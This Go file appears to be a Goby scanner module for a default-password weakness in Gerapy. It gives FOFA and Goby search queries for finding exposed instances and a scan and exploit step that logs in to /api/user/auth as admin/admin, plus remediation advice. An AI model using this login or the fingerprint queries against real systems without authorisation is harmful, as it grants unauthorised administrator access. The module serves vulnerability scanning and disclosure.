package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Gerapy Default password vulnerability",
    "Description": "<p>Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django, and Vue.  Gerapy has weak password vulnerability. Attackers can directly use the default password admin/admin to log in to the background as an administrator and obtain sensitive information. </p>",
    "Product": "Gerapy",
    "Homepage": "https://github.com/Gerapy/Gerapy",
    "DisclosureDate": "2021-06-30",
    "Author": "afei00123",
    "FofaQuery": "title=\"Gerapy\"",
    "GobyQuery": "title=\"Gerapy\"",
    "Level": "1",
    "Impact": "An attacker can log in as an administrator to obtain sensitive information.",
    "Recommendation": "1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.2. If not necessary, prohibit public network access to the system.3. Set access policies and whitelist access through security devices such as firewalls.",
    "References": [
        "https://github.com/Gerapy/Gerapy"
    ],
    "Is0day": false,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/user/auth",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json;charset=utf-8"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"admin\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"token\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/user/auth",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json;charset=utf-8"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"admin\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|admin:admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Gerapy 默认口令漏洞",
            "Product": "Gerapy",
            "Description": "<p>Gerapy是一款开源的基于Scrapy、Scrapyd、Django和Vue.js的分布式爬虫管理框架。Gerapy存在弱口令漏洞，攻击者可直接利用默认口令admin/admin以管理员登录后台，获取敏感信息。<br></p>",
            "Recommendation": "<pre><code>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。2、如非必要，禁止公网访问该系统。3、通过防火墙等安全设备设置访问策略，设置白名单访问。</code></pre>",
            "Impact": "<p><span style=\"font-size: 18px;\">攻击者可直接以管理员登录，获取敏感信息。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Gerapy Default password vulnerability",
            "Product": "Gerapy",
            "Description": "<p><span style=\"color: rgb(42, 43, 46); font-size: 16px;\">Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django, and Vue.&nbsp;</span><span style=\"color: rgb(42, 43, 46); font-size: 16px;\">&nbsp;Gerapy has weak password vulnerability. Attackers can directly use the default password admin/admin to log in to the background as an administrator and obtain sensitive information.&nbsp;</span><br></p>",
            "Recommendation": "<pre><code>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.2. If not necessary, prohibit public network access to the system.3. Set access policies and whitelist access through security devices such as firewalls.</code></pre>",
            "Impact": "<ul><li><p>An attacker can log in as an administrator to obtain sensitive information.</p></li></ul>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
